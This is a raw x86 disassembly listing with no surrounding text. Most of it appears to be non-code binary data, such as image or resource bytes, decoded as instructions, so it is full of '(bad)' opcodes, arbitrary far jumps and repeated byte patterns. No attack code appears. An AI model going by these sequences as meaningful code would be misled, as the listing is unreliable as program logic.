  412275:	jne    0x4122ba
  412277:	push   ebp
  412278:	aad    0x8b
  41227a:	pop    esi
  41227b:	scas   eax,DWORD PTR es:[edi]
  41227c:	test   DWORD PTR [edi],0xfe1fc3f
  412282:	cmpxchg bh,al
  412285:	mov    dl,0x93
  412287:	or     DWORD PTR [ecx-0x65],edx
  41228a:	mov    eax,edx
  41228c:	or     bh,BYTE PTR cs:[ebp+0x3b]
  412290:	add    dl,BYTE PTR [eax-0x65d90967]
  412296:	test   esi,edi
  412298:	call   0xcf80:0x21c13e09
  41229f:	add    DWORD PTR [esi-0x4a960582],ebx
  4122a5:	pop    edx
  4122a6:	lods   eax,DWORD PTR ds:[esi]
  4122a7:	ficom  WORD PTR [ecx+ebp*4+0x54]
  4122ab:	out    dx,al
  4122ac:	push   edi
  4122ad:	push   ebp
  4122ae:	cmc    
  4122af:	fstp   TBYTE PTR [edx-0x505e8052]
  4122b5:	scas   eax,DWORD PTR es:[edi]
  4122b6:	dec    edi
  4122b7:	sbb    eax,0x7541c1c
  4122bc:	push   es
  4122bd:	push   es
  4122be:	xchg   esp,eax
  4122bf:	int    0x9b
  4122c1:	aaa    
  4122c2:	mov    ds:0x1acfafaf,eax
  4122c7:	push   ecx
  4122c8:	xchg   DWORD PTR [esi-0x3cfd192f],esp
  4122ce:	int    0x7e
  4122d0:	mov    ebx,0x1e406254
  4122d5:	fst    DWORD PTR [edi]
  4122d7:	test   ebx,edx
  4122d9:	outs   dx,BYTE PTR ds:[esi]
  4122da:	fwait
  4122db:	mov    ebx,0xe8023205
  4122e0:	call   0xfadbd3cd
  4122e5:	inc    esp
  4122e6:	ja     0x41232a
  4122e8:	mov    esp,0x581861a7
  4122ed:	pop    esp
  4122ee:	pop    esp
  4122ef:	mov    ah,0x82
  4122f1:	xor    DWORD PTR [ecx+eiz*8],0x4c1e8d2c
  4122f8:	in     al,0x37
  4122fa:	aaa    
  4122fb:	aaa    
  4122fc:	xchg   DWORD PTR [ecx+0x65cb1999],ebx
  412302:	shl    BYTE PTR [ebp-0x3],1
  412305:	arpl   WORD PTR [edi+0x5573f5cb],dx
  41230b:	push   ebp
  41230c:	dec    edi
  41230d:	add    ebx,DWORD PTR [eax]
  41230f:	cli    
  412310:	ror    DWORD PTR [edi-0x436c6b82],1
  412316:	push   edx
  412317:	add    eax,0x6513210d
  41231c:	test   BYTE PTR [esi+0x155d6c29],cl
  412322:	mov    cs,WORD PTR [ebx+0x6e89e7]
  412328:	pop    edi
  412329:	xchg   edi,eax
  41232a:	imul   edi,edx,0x4f82e6b
  412330:	xchg   DWORD PTR [eax],eax
  412332:	ds addr16 cwde 
  412335:	sahf   
  412336:	sahf   
  412337:	jbe    0x412358
  412339:	cmp    dh,BYTE PTR [eax+ebp*2+0x57]
  41233d:	cmp    al,0x1e
  41233f:	(bad)  
  412340:	fistp  DWORD PTR [eax+0x2c]
  412343:	imul   BYTE PTR ds:0x9dc35555
  412349:	popf   
  41234a:	popf   
  41234b:	out    dx,al
  41234c:	sbb    ebp,DWORD PTR [edi-0x44]
  41234f:	push   ecx
  412350:	fnstenv [ecx+0x6e360763]
  412356:	fmul   QWORD PTR [eax-0x2be94790]
  41235c:	cs xchg ebp,eax
  41235e:	dec    edx
  41235f:	shl    BYTE PTR [ecx*1-0x6531a347],1
  412366:	mov    bp,WORD PTR [esp+eax*1]
  41236a:	cmp    esi,DWORD PTR [edx]
  41236c:	add    BYTE PTR [esi-0x48a0c1f6],dl
  412372:	mov    bl,0x2
  412374:	mov    eax,0x3f0a2fd9
  412379:	sub    eax,0x54e2c024
  41237e:	pop    edi
  41237f:	jl     0x412319
  412381:	lock jb 0x41233d
  412384:	fdiv   QWORD PTR [edx+ecx*4]
  412387:	adc    BYTE PTR [ebp+0x22],cl
  41238a:	sbb    cl,BYTE PTR [esi+eax*1]
  41238d:	push   ecx
  41238e:	lods   eax,DWORD PTR ds:[esi]
  41238f:	push   esi
  412390:	push   ecx
  412391:	sub    al,0x16
  412393:	xor    DWORD PTR ds:0x974b8d3d,edi
  412399:	cs pop ecx
  41239b:	icebp  
  41239c:	adc    BYTE PTR [eax],al
  41239e:	and    eax,0xa6f5cb97
  4123a3:	stos   BYTE PTR es:[edi],al
  4123a4:	stos   BYTE PTR es:[edi],al
  4123a5:	mov    edi,0xb5f55551
  4123aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123ab:	sahf   
  4123ac:	jp     0x4123d8
  4123ae:	mov    ebx,0x8adad7c2
  4123b3:	adc    BYTE PTR [ebx+edi*8-0x26],ah
  4123b7:	ins    DWORD PTR es:[edi],dx
  4123b8:	scas   eax,DWORD PTR es:[edi]
  4123b9:	and    al,0x9a
  4123bb:	jg     0x412392
  4123bd:	test   DWORD PTR [esi-0x307fde3d],ebx
  4123c3:	xor    DWORD PTR [esi-0xa4dc6e4],ecx
  4123c9:	shl    BYTE PTR [ebp+0x1b1cdf4b],cl
  4123cf:	sbb    edi,DWORD PTR [ebx+0x38]
  4123d2:	popf   
  4123d3:	dec    esi
  4123d4:	out    dx,eax
  4123d5:	jb     0x412392
  4123d7:	fisttp QWORD PTR [edx+0x28]
  4123da:	adc    al,0x52
  4123dc:	ss ins DWORD PTR es:[edi],dx
  4123de:	fiadd  DWORD PTR [ebx+ebx*2+0x1b05b96e]
  4123e5:	ss ins BYTE PTR es:[edi],dx
  4123e7:	inc    eax
  4123e8:	outs   dx,DWORD PTR ds:[esi]
  4123e9:	outs   dx,DWORD PTR ds:[esi]
  4123ea:	scas   eax,DWORD PTR es:[edi]
  4123eb:	and    eax,0xa0efd4e4
  4123f0:	push   eax
  4123f1:	sub    BYTE PTR [eax+0x79],bl
  4123f4:	div    DWORD PTR [edx-0x12f78c67]
  4123fa:	mov    ah,0x3e
  4123fc:	aaa    
  4123fd:	sti    
  4123fe:	gs sti 
  412400:	(bad)
  412403:	fucomip st,st(7)
  412405:	mov    bh,0x86
  412407:	icebp  
  412408:	push   ss
  412409:	pop    ebx
  41240a:	or     dl,BYTE PTR [eax*2-0xcf7794f]
  412411:	js     0x41244f
  412413:	lock sti 
  412415:	std    
  412416:	(bad)  
  412417:	cwde   
  412418:	add    BYTE PTR [ecx+0x53530e5c],bh
  41241e:	push   ebx
  41241f:	mov    BYTE PTR [esi-0x5d],al
  412422:	dec    eax
  412423:	and    al,0x12
  412425:	enter  0x72e5,0x34
  412429:	or     edx,ecx
  41242b:	inc    esp
  41242c:	pop    ebp
  41242d:	lock jg 0x412421
  412430:	int3   
  412431:	xor    ecx,edi
  412433:	pushf  
  412434:	mov    edx,0x95b8af06
  412439:	mov    ebx,0x397b6ad0
  41243e:	sar    esp,1
  412440:	jbe    0x412409
  412442:	scas   al,BYTE PTR es:[edi]
  412443:	or     bl,BYTE PTR [edx+eax*1]
  412446:	clc    
  412447:	or     eax,DWORD PTR [eax+0x22]
  41244a:	xchg   ecx,eax
  41244b:	lock jl 0x412446
  41244e:	loope  0x4123d7
  412450:	mov    ebx,0xbde8d1a3
  412455:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412456:	push   edx
  412457:	imul   edx,ebx,0x26cccccc
  41245d:	dec    ebp
  41245e:	shl    DWORD PTR [esi-0x4e265966],cl
  412464:	jp     0x41245b
  412466:	push   0x6c
  412468:	fnstsw WORD PTR [edx-0x20202eb]
  41246e:	mov    BYTE PTR [edx+eiz*1-0x78],al
  412472:	inc    esp
  412473:	and    cl,BYTE PTR [eax]
  412475:	xchg   ebx,eax
  412477:	dec    ebp
  412478:	ret    
  412479:	outs   dx,DWORD PTR ds:[esi]
  41247a:	sar    DWORD PTR [eax],cl
  41247c:	jns    0x4124fa
  41247e:	jmp    0x7cdc:0x24c8d22d
  412485:	jbe    0x4124a4
  412487:	push   ds
  412488:	movups xmm4,XMMWORD PTR [ebx+0x3]
  41248c:	inc    eax
  41248d:	mov    ds:0x3dcc5edd,eax
  412492:	mov    al,ds:0x9a00f7be
  412497:	inc    esi
  412498:	jecxz  0x41243b
  41249a:	jmp    0x4124b3
  41249c:	or     al,BYTE PTR ds:0xe479f3e4
  4124a2:	jb     0x4124dd
  4124a4:	in     al,0x72
  4124a6:	cmp    DWORD PTR [esp+ebp*1],ebp
  4124a9:	sub    al,0x20
  4124ab:	xchg   ecx,eax
  4124ac:	dec    eax
  4124ad:	and    BYTE PTR [ebp+0x2850a34e],bl
  4124b3:	add    DWORD PTR fs:[ecx+edi*4+0x5c],ecx
  4124b8:	scas   al,BYTE PTR es:[edi]
  4124b9:	sub    DWORD PTR [ebp+0x55],edx
  4124bc:	inc    edi
  4124bd:	push   ebp
  4124be:	push   ebp
  4124bf:	cmp    eax,0x7ddde000
  4124c4:	sti    
  4124c5:	imul   BYTE PTR [ebp+0x14afdb54]
  4124cb:	push   edi
  4124cc:	pop    ebx
  4124cd:	xchg   BYTE PTR [esi+0x3873d0b9],ch
  4124d3:	add    al,0xf0
  4124d5:	pop    ss
  4124d6:	mov    BYTE PTR [esi+esi*1-0x15],ch
  4124da:	fwait
  4124db:	cwde   
  4124dc:	cwde   
  4124dd:	pop    eax
  4124de:	xor    esi,DWORD PTR ds:0x34677535
  4124e4:	sbb    bl,ch
  4124e6:	jne    0x4124c9
  4124e8:	ret    0xfb85
  4124eb:	or     eax,DWORD PTR [ebp+0x10016c2]
  4124f1:	mov    edi,0xdfbf0fdf
  4124f6:	imul   edx,edi
  4124f9:	mov    ebx,DWORD PTR [esi+0x5bac1e9e]
  4124ff:	mov    bh,0xe
  412501:	mov    ebp,0xeee8bdbd
  412506:	out    dx,al
  412507:	inc    esi
  412508:	push   edi
  412509:	push   edi
  41250a:	pop    ss
  41250b:	jp     0x412588
  41250d:	jnp    0x41253c
  41250f:	sub    eax,0xcef3aadc
  412514:	jb     0x412556
  412516:	or     BYTE PTR [ebp-0x5c],0xa2
  41251a:	jmp    0x4124d6
  41251c:	adc    eax,0xb366c89f
  412521:	dec    eax
  412522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412523:	push   edx
  412524:	xchg   esi,eax
  412525:	and    BYTE PTR [edi+0x32],0x19
  412529:	stos   DWORD PTR es:[edi],eax
  41252a:	inc    edi
  41252b:	pop    edi
  41252c:	popf   
  41252d:	ins    BYTE PTR es:[edi],dx
  41252e:	je     0x412530
  412530:	out    0x5c,eax
  412532:	xlat   BYTE PTR cs:[ebx]
  412534:	or     DWORD PTR [ebp+0x55],edx
  412537:	dec    edi
  412538:	mov    eax,0x8a83ae5c
  41253d:	mov    ds:0xdcf73ccc,al
  412542:	jae    0x412536
  412544:	cmp    al,0xe1
  412546:	dec    edi
  412547:	paddusb mm3,QWORD PTR [ebp-0x60]
  41254b:	ins    DWORD PTR es:[edi],dx
  41254c:	sbb    DWORD PTR [esi],edi
  41254e:	push   ebp
  41254f:	inc    ecx
  412550:	mov    bh,0x83
  412552:	inc    ebx
  412553:	add    BYTE PTR [esi],cl
  412555:	nop
  412556:	dec    eax
  412557:	and    al,0xfc
  412559:	inc    ebx
  41255a:	inc    ebx
  41255b:	inc    ebx
  41255c:	sbb    esi,DWORD PTR [ebp+ebx*2-0x41]
  412560:	and    eax,0x3cde8d1a
  412565:	ss test BYTE PTR ss:0x32653700,0x99
  41256e:	sahf   
  41256f:	bound  esi,QWORD PTR [ecx+0x5145418]
  412575:	add    DWORD PTR [eax-0x40],0x4d4b5aea
  41257c:	push   0x5d
  41257e:	pop    ebp
  41257f:	pop    ebp
  412580:	(bad)  
  412581:	inc    BYTE PTR [eax+0x20]
  412584:	add    BYTE PTR [eax+0x20],0x60
  412588:	dec    ebp
  412589:	cmp    ch,BYTE PTR [edx-0x3c172d8]
  41258f:	xchg   BYTE PTR [ecx+0x40],ah
  412592:	shl    DWORD PTR [ebx+ecx*8],cl
  412595:	adc    ch,BYTE PTR [eax]
  412597:	push   ss
  412598:	mov    edx,DWORD PTR [esi+0x42]
  41259b:	mov    fs,WORD PTR [esi+0xd34d069]
  4125a1:	stc    
  4125a2:	jl     0x4125c2
  4125a4:	test   DWORD PTR [edx-0x3f],eax
  4125a7:	sbb    ah,dl
  4125a9:	fwait
  4125aa:	lods   al,BYTE PTR ds:[esi]
  4125ab:	or     eax,DWORD PTR [eax]
  4125ad:	jo     0x412568
  4125af:	pop    esp
  4125b0:	mov    edx,0xaa8baaaa
  4125b5:	stos   BYTE PTR es:[edi],al
  4125b6:	jle    0x412560
  4125b8:	stos   BYTE PTR es:[edi],al
  4125b9:	jmp    0x3d55:0x54170019
  4125c0:	test   eax,0xf3f0ca28
  4125c5:	iret   
  4125c6:	aas    
  4125c7:	jg     0x41257e
  4125c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125ca:	xchg   esi,eax
  4125cb:	sti    
  4125cc:	mov    eax,DWORD PTR [edx-0x69f1ffbd]
  4125d2:	and    BYTE PTR [ebp-0x3cf346b6],dl
  4125d8:	or     BYTE PTR [ebp+0x75667339],bl
  4125de:	test   eax,0x30d5ba54
  4125e3:	mov    ebp,cs
  4125e5:	addr16 iret 
  4125e7:	sahf   
  4125e8:	pop    ebp
  4125e9:	xchg   ebx,eax
  4125ea:	int    0x66
  4125ec:	aaa    
  4125ed:	cdq    
  4125ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125ef:	mov    ecx,0x3ecd34d9
  4125f4:	pop    ebp
  4125f5:	xlat   BYTE PTR ds:[ebx]
  4125f6:	jge    0x4125bd
  4125f8:	(bad)
  4125fd:	aad    0x6a
  4125ff:	mov    ch,0xea
  412601:	xor    cl,BYTE PTR [ebx+eax*2]
  412604:	push   ebp
  412605:	push   ebp
  412606:	push   ebp
  412607:	and    eax,0xdd75d721
  41260c:	dec    edx
  41260d:	inc    esi
  41260e:	push   edx
  41260f:	adc    al,0xc5
  412611:	retf   0xa7f3
  412614:	pusha  
  412615:	bound  edi,QWORD PTR [ecx+0x29ea365c]
  41261b:	mov    edx,0x1528a286
  412620:	push   ebp
  412621:	push   ebp
  412622:	dec    ebp
  412623:	push   ebp
  412624:	push   ebp
  412625:	sub    ebp,DWORD PTR [edx+0x5554c6aa]
  41262b:	lea    eax,[edx]
  41262d:	mov    BYTE PTR [ebx+0x28ae3aaa],ch
  412633:	retf   0x4505
  412636:	push   ecx
  412637:	add    DWORD PTR cs:[eax],ebx
  41263a:	jnp    0x41261d
  41263c:	test   DWORD PTR [edi],edx
  41263e:	cs (bad) 
  412640:	jmp    0x1428f123
  412645:	push   cs
  412646:	add    DWORD PTR [eax],edi
  412648:	pop    eax
  412649:	ss push edx
  41264b:	test   eax,0x43a00294
  412650:	push   ebp
  412651:	push   ebp
  412652:	dec    edi
  412653:	es xchg ebx,eax
  412655:	icebp  
  412656:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412657:	shr    ecx,cl
  412659:	cs inc ebp
  41265b:	push   ecx
  41265c:	jl     0x412606
  41265e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41265f:	retf   
  412660:	jp     0x4126ae
  412662:	ror    DWORD PTR [ecx+eax*1],cl
  412665:	push   eax
  412666:	push   esp
  412667:	push   ebp
  412668:	lods   eax,DWORD PTR ds:[esi]
  412669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41266a:	shr    DWORD PTR [ecx+0x77],cl
  41266d:	sub    dl,BYTE PTR [ebp-0x5d75d7f6]
  412673:	mov    eax,0xbaf32e5c
  412678:	jmp    0x412628
  41267a:	retf   
  41267b:	test   eax,0x55aaa
  412680:	xchg   edi,eax
  412681:	retf   
  412682:	push   ebp
  412683:	cmp    DWORD PTR [edx-0xc],edi
  412686:	test   al,0x76
  412688:	loop   0x41264e
  41268a:	mov    DWORD PTR [edx+0x28],ebp
  41268d:	adc    al,0xca
  41268f:	mov    ebx,0xa29cae5c
  412694:	sub    BYTE PTR ds:0x51457900,al
  41269a:	or     bh,BYTE PTR [edi]
  41269c:	stc    
  41269d:	leave  
  41269e:	dec    edi
  41269f:	(bad)  
  4126a0:	aam    0x66
  4126a2:	mov    esp,0x1c0e0703
  4126a7:	cmp    BYTE PTR [eax-0x20],dh
  4126aa:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126b1:	jo     0x412693
  4126b3:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126ba:	jo     0x41269c
  4126bc:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126c3:	jo     0x4126a5
  4126c5:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126cc:	jo     0x4126ae
  4126ce:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126d5:	jo     0x4126b7
  4126d7:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126de:	jo     0x4126c0
  4126e0:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126e7:	jo     0x4126c9
  4126e9:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126f0:	jo     0x4126d2
  4126f2:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126f9:	jo     0x4126db
  4126fb:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  412702:	jo     0x4126e4
  412704:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  41270b:	jo     0x4126ed
  41270d:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  412714:	jo     0x4126f6
  412716:	rol    cl,0x15
  412719:	loopne 0x41271a
  41271b:	add    eax,DWORD PTR [esi]
  41271d:	shl    eax,0x29
  412720:	xor    ecx,DWORD PTR [ebx+0x68]
  412723:	inc    BYTE PTR [eax]
  412725:	add    BYTE PTR [eax],al
  412727:	add    BYTE PTR [ecx+0x45],cl
  41272a:	dec    esi
  41272b:	inc    esp
  41272c:	scas   al,BYTE PTR es:[edi]
  41272d:	inc    edx
  41272e:	pusha  
  41272f:	sub    BYTE PTR [eax],0x0
  412732:	add    BYTE PTR [eax],al
  412734:	xor    BYTE PTR [eax],al
  412736:	add    BYTE PTR [eax],al
  412738:	pusha  
  412739:	add    BYTE PTR [eax],al
  41273b:	add    BYTE PTR [ecx],al
  41273d:	add    BYTE PTR [eax],ah
  41273f:	add    BYTE PTR [eax],al
  412741:	add    BYTE PTR [eax],al
  412743:	add    BYTE PTR [eax+0x25],al
	...
  4129ed:	add    BYTE PTR [eax],al
  4129ef:	add    BYTE PTR [ecx-0x44fa4e4f],dh
  4129f5:	mov    ebx,0xb3b31cbb
  4129fa:	mov    bl,0x55
  4129fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129ff:	xor    BYTE PTR [ecx-0x4d704e4f],0xb2
  412a06:	mov    dl,0x96
  412a08:	mov    ah,0xb4
  412a0a:	mov    ah,0x99
  412a0c:	stos   DWORD PTR es:[edi],eax
  412a0d:	stos   DWORD PTR es:[edi],eax
  412a0e:	stos   DWORD PTR es:[edi],eax
  412a0f:	xchg   edi,eax
  412a10:	lea    ecx,[ebp-0x7d7d6d73]
  412a16:	add    BYTE PTR [edx+0x5c797979],0x72
  412a1d:	jb     0x412a91
  412a1f:	and    eax,DWORD PTR [ecx+0x78181]
	...
  412aa5:	add    BYTE PTR [eax],al
  412aa7:	add    BYTE PTR [ebp-0x57e57273],cl
  412aad:	test   al,0xa8
  412aaf:	jne    0x412a6d
  412ab1:	mov    esp,0xcdcdd1bc
  412ab6:	int    0xff
  412ab8:	aad    0xd5
  412aba:	aad    0xff
  412abc:	(bad)  
  412abe:	(bad)  
  412ac0:	in     eax,0xe5
  412ac2:	in     eax,0xff
  412ac4:	in     eax,0xe5
  412ac6:	in     eax,0xff
  412ac8:	loope  0x412aab
  412aca:	loope  0x412acb
  412acc:	(bad)  
  412ace:	fdiv   st(7),st
  412ad0:	fstp   st(5)
  412ad2:	(bad)  
  412ad4:	(bad)  
  412ad6:	fdivp  st(7),st
  412ad8:	rcl    ebx,cl
  412ada:	sar    edi,cl
  412adc:	rol    al,0xc0
  412adf:	jmp    DWORD PTR [ecx-0x731f5e5f]
  412ae5:	mov    WORD PTR [edi+eax*4+0x22969696],cs
	...
  412afc:	add    BYTE PTR [eax],al
  412afe:	add    BYTE PTR [edx],al
  412b00:	add    BYTE PTR [eax],al
  412b02:	add    BYTE PTR [edx],al
  412b04:	add    BYTE PTR [eax],al
  412b06:	add    BYTE PTR [ecx],al
	...
  412b64:	(bad)  
  412b65:	(bad)  
  412b66:	(bad)  
  412b67:	addr16 mov bh,0xb7
  412b6a:	mov    bh,0xea
  412b6c:	aam    0xd4
  412b6e:	aam    0xff
  412b70:	xlat   BYTE PTR ds:[ebx]
  412b71:	xlat   BYTE PTR ds:[ebx]
  412b72:	xlat   BYTE PTR ds:[ebx]
  412b73:	(bad)  
  412b74:	fcmovnu st,st(3)
  412b76:	(bad)  
  412b78:	(bad)  
  412b7a:	fdiv   st(7),st
  412b7c:	fcmovnu st,st(3)
  412b7e:	(bad)  
  412b80:	fcmovu st,st(2)
  412b82:	(bad)  
  412b84:	(bad)  
  412b85:	(bad)  
  412b86:	(bad)  
  412b87:	call   ecx
  412b89:	rcl    ecx,1
  412b8b:	dec    ecx
  412b8d:	leave  
  412b8e:	leave  
  412b8f:	dec    esp
  412b91:	int3   
  412b92:	int3   
  412b93:	(bad)  
  412b94:	(bad)  
  412b96:	(bad)  
  412b98:	(bad)  
  412b9a:	fcos   
  412b9c:	ret    0xc2c2
  412b9f:	(bad)  
  412ba0:	mov    edi,0xc9ffbfbf
  412ba5:	leave  
  412ba6:	leave  
  412ba7:	jmp    FWORD PTR [ebp+0x63f9adad]
  412bad:	arpl   WORD PTR [ebx-0x7a],sp
  412bb0:	xor    eax,0xf3535
  412bb5:	add    BYTE PTR [eax],al
  412bb7:	add    BYTE PTR [eax],al
  412bb9:	add    BYTE PTR [eax],al
  412bbb:	push   ss
  412bbc:	add    BYTE PTR [eax],al
  412bbe:	add    BYTE PTR [ecx],bl
  412bc0:	add    BYTE PTR [eax],al
  412bc2:	add    BYTE PTR [edi],dl
  412bc4:	add    BYTE PTR [eax],al
  412bc6:	add    BYTE PTR ds:0x4000000,cl
  412bcc:	add    BYTE PTR [eax],al
  412bce:	add    BYTE PTR [edx],al
  412bd0:	add    BYTE PTR [eax],al
  412bd2:	add    BYTE PTR [ecx],al
	...
  412c20:	mov    ds:0xcaa6a2a2,al
  412c25:	retf   0xffca
  412c28:	rcl    al,1
  412c2a:	sar    bh,1
  412c2c:	retf   
  412c2d:	retf   
  412c2e:	retf   
  412c2f:	dec    ebx
  412c31:	retf   
  412c32:	retf   
  412c33:	call   eax
  412c35:	rcl    al,1
  412c37:	call   edi
  412c39:	xlat   BYTE PTR ds:[ebx]
  412c3a:	xlat   BYTE PTR ds:[ebx]
  412c3b:	(bad)  
  412c3c:	fcmovu st,st(2)
  412c3e:	(bad)  
  412c40:	fcmovnu st,st(3)
  412c42:	(bad)  
  412c44:	fcmovu st,st(2)
  412c46:	(bad)  
  412c48:	aam    0xd4
  412c4a:	aam    0xff
  412c4c:	retf   
  412c4d:	retf   
  412c4e:	retf   
  412c4f:	call   edx
  412c51:	rcl    dl,cl
  412c53:	jmp    esp
  412c55:	in     al,0xe4
  412c57:	dec    ebp
  412c59:	int    0xcd
  412c5b:	push   DWORD PTR [edx-0x3b004d4e]
  412c61:	(bad)  
  412c62:	(bad)  
  412c63:	dec    eax
  412c65:	enter  0xffc8,0xb9
  412c69:	mov    ecx,0xc4c4ffb9
  412c6e:	(bad)  
  412c6f:	(bad)  
  412c70:	jle    0x412cf0
  412c72:	jle    0x412c3c
  412c74:	or     eax,0x3d0d0d
  412c79:	add    BYTE PTR [eax],al
  412c7b:	xor    DWORD PTR [eax],eax
  412c7d:	add    BYTE PTR [eax],al
  412c7f:	cmp    eax,0x32000000
  412c84:	add    BYTE PTR [eax],al
  412c86:	add    BYTE PTR [edx],ah
  412c88:	add    BYTE PTR [eax],al
  412c8a:	add    BYTE PTR [ebx],dl
  412c8c:	add    BYTE PTR [eax],al
  412c8e:	add    BYTE PTR [eax],cl
  412c90:	add    BYTE PTR [eax],al
  412c92:	add    BYTE PTR [eax+eax*1],al
  412c95:	add    BYTE PTR [eax],al
  412c97:	add    DWORD PTR [eax],eax
	...
  412cd9:	add    BYTE PTR [eax],al
  412cdb:	add    BYTE PTR [ebp-0x3a7a6263],bl
  412ce1:	(bad)
  412ce4:	(bad)  
  412ce5:	(bad)  
  412ce6:	(bad)  
  412ce7:	inc    ecx
  412ce9:	rol    ecx,0xff
  412cec:	mov    edi,0xccccffc7
  412cf2:	int3   
  412cf3:	call   eax
  412cf5:	rcl    al,1
  412cf7:	call   edi
  412cf9:	xlat   BYTE PTR ds:[ebx]
  412cfa:	xlat   BYTE PTR ds:[ebx]
  412cfb:	(bad)  
  412cfc:	(bad)  
  412cfe:	fdiv   st(7),st
  412d00:	fstp   st(5)
  412d02:	(bad)  
  412d04:	(bad)  
  412d06:	fdiv   st(7),st
  412d08:	aam    0xd4
  412d0a:	aam    0xff
  412d0c:	enter  0xc8c8,0xff
  412d10:	rcl    ebx,cl
  412d12:	sar    edi,cl
  412d14:	(bad)  
  412d16:	fdivp  st(7),st
  412d18:	rol    ecx,0xc1
  412d1b:	inc    edx
  412d1d:	ret    0xffc2
  412d20:	retf   0xcaca
  412d23:	push   DWORD PTR [ebp-0x53004a4b]
  412d29:	lods   al,BYTE PTR ds:[esi]
  412d2a:	lods   al,BYTE PTR ds:[esi]
  412d2b:	jmp    FWORD PTR [esp+ebp*4-0x3d3d0054]
  412d32:	ret    0x6eff
  412d35:	outs   dx,BYTE PTR ds:[esi]
  412d36:	outs   dx,BYTE PTR ds:[esi]
  412d37:	enter  0x0,0x0
  412d3b:	dec    eax
  412d3c:	add    BYTE PTR [eax],al
  412d3e:	add    BYTE PTR [ebx+0x0],cl
  412d41:	add    BYTE PTR [eax],al
  412d43:	inc    eax
  412d44:	add    BYTE PTR [eax],al
  412d46:	add    BYTE PTR [edx],dh
  412d48:	add    BYTE PTR [eax],al
  412d4a:	add    BYTE PTR [eax+eax*1],ah
  412d4d:	add    BYTE PTR [eax],al
  412d4f:	adc    eax,0xb000000
  412d54:	add    BYTE PTR [eax],al
  412d56:	add    BYTE PTR ds:0x0,al
	...
  412d9c:	mov    dh,0xb6
  412d9e:	mov    dh,0xee
  412da0:	mov    ebp,0xbdffbdbd
  412da5:	mov    ebp,0xc1c1ffbd
  412daa:	sar    edi,0xc4
  412dad:	(bad)  
  412dae:	(bad)  
  412daf:	dec    eax
  412db1:	enter  0xffc8,0xce
  412db5:	into   
  412db6:	into   
  412db7:	call   ebp
  412db9:	aad    0xd5
  412dbb:	(bad)  
  412dbc:	(bad)  
  412dbe:	fdiv   st(7),st
  412dc0:	fstp   st(5)
  412dc2:	(bad)  
  412dc4:	fcmovu st,st(2)
  412dc6:	(bad)  
  412dc8:	rcl    dl,cl
  412dca:	sar    bh,cl
  412dcc:	mov    edi,0xcdcdffc7
  412dd2:	int    0xff
  412dd4:	int    0xcd
  412dd6:	int    0xff
  412dd8:	rol    ecx,0xc1
  412ddb:	inc    edx
  412ddd:	ret    0xffc2
  412de0:	mov    ah,0xb4
  412de2:	mov    ah,0xff
  412de4:	scas   eax,DWORD PTR es:[edi]
  412de5:	scas   eax,DWORD PTR es:[edi]
  412de6:	scas   eax,DWORD PTR es:[edi]
  412de7:	jmp    FWORD PTR [eax-0x66005758]
  412ded:	cdq    
  412dee:	cdq    
  412def:	jmp    DWORD PTR [esi-0x6800595a]
  412df5:	xchg   edi,eax
  412df6:	xchg   edi,eax
  412df7:	in     al,dx
  412df8:	or     eax,0x5e0d0d
  412dfd:	add    BYTE PTR [eax],al
  412dff:	inc    ecx
  412e00:	add    BYTE PTR [eax],al
  412e02:	add    BYTE PTR [eax+eax*1+0x0],al
  412e06:	add    BYTE PTR [esi],dh
  412e08:	add    BYTE PTR [eax],al
  412e0a:	add    BYTE PTR [edi],ah
  412e0c:	add    BYTE PTR [eax],al
  412e0e:	add    BYTE PTR [eax+eax*1],bl
  412e11:	add    BYTE PTR [eax],al
  412e13:	adc    al,BYTE PTR [eax]
  412e15:	add    BYTE PTR [eax],al
  412e17:	or     DWORD PTR [eax],eax
	...
  412e59:	add    BYTE PTR [eax],al
  412e5b:	add    BYTE PTR [esi-0x4813494a],dh
  412e61:	mov    bh,0xb7
  412e63:	(bad)  
  412e64:	mov    edx,0xbdffbaba
  412e69:	mov    ebp,0xc0c0ffbd
  412e6e:	sar    bh,0xc4
  412e71:	(bad)  
  412e72:	(bad)  
  412e73:	dec    ecx
  412e75:	leave  
  412e76:	leave  
  412e77:	dec    edi
  412e79:	iret   
  412e7a:	iret   
  412e7b:	call   esi
  412e7d:	(bad)  
  412e7e:	(bad)  
  412e7f:	call   edi
  412e81:	xlat   BYTE PTR ds:[ebx]
  412e82:	xlat   BYTE PTR ds:[ebx]
  412e83:	call   ebp
  412e85:	aad    0xd5
  412e87:	dec    ebp
  412e89:	int    0xcd
  412e8b:	inc    esp
  412e8d:	(bad)  
  412e8e:	(bad)  
  412e8f:	inc    ebp
  412e91:	(bad)
  412e94:	rol    al,0xc0
  412e97:	(bad)  
  412e98:	mov    ebp,0xb6ffbdbd
  412e9d:	mov    dh,0xb6
  412e9f:	jmp    FWORD PTR [esi-0x5d005152]
  412ea5:	mov    ds:0x9494ffa2,al
  412eaa:	xchg   esp,eax
  412eab:	call   DWORD PTR [eax-0x5a006f70]
  412eb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eb3:	call   FWORD PTR [ebp+0x17ef9d9d]
